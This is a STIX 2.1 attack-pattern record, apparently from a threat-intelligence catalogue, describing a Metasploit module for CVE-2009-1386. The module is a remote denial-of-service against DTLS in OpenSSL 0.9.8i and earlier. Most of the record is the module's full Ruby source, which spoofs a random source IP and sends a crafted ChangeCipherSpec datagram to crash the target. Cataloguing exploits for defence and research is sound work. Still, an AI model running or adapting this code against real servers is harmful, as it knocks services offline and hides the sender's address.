{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f945229-d4cf-47b4-88b8-5d23fc0bafef",
    "created": "2024-08-14T16:25:52.903611Z",
    "modified": "2024-08-14T16:25:52.903615Z",
    "name": "OpenSSL DTLS ChangeCipherSpec Remote DoS",
    "description": " This module performs a Denial of Service Attack against Datagram TLS in OpenSSL version 0.9.8i and earlier. OpenSSL crashes under these versions when it receives a ChangeCipherspec Datagram before a ClientHello. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/ssl/dtls_changecipherspec.rb",
            "external_id": "dtls_changecipherspec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-1386"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Dos\n  include Msf::Exploit::Capture\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t=> 'OpenSSL DTLS ChangeCipherSpec Remote DoS',\n      'Description'\t=> %q{\n          This module performs a Denial of Service Attack against Datagram TLS in OpenSSL\n        version 0.9.8i and earlier. OpenSSL crashes under these versions when it receives a\n        ChangeCipherspec Datagram before a ClientHello.\n      },\n      'Author'\t=> [\n            'Jon Oberheide <jon[at]oberheide.org>', #original code\n            'theLightCosine' # metasploit module\n            ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2009-1386' ],\n          [ 'OSVDB', '55073'],\n        ],\n      'DisclosureDate' => '2000-04-26'))\n\n    register_options([\n        Opt::RPORT(80),\n        Opt::RHOST\n      ]\n    )\n\n    deregister_options('FILTER','PCAPFILE', 'INTERFACE', 'SNAPLEN', 'TIMEOUT')\n  end\n\n  def run\n    open_pcap\n    print_status(\"Creating DTLS ChangeCipherSpec Datagram...\")\n    p = PacketFu::UDPPacket.new\n    p.ip_daddr = datastore['RHOST']\n    p.ip_src = rand(0x100000000)\n    p.ip_ttl = 44\n    p.udp_sport = 34060\n    p.udp_dport = datastore['RPORT'].to_i\n    p.payload = \"\\x14\\xfe\\xff\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x01\"\n    p.recalc\n    print_status(\"Sending Datagram to target...\")\n    capture_sendto(p, '255.255.255.255')\n    close_pcap\n  end\nend\n",
    "x_mitre_disclosure_date": "2000-04-26"
}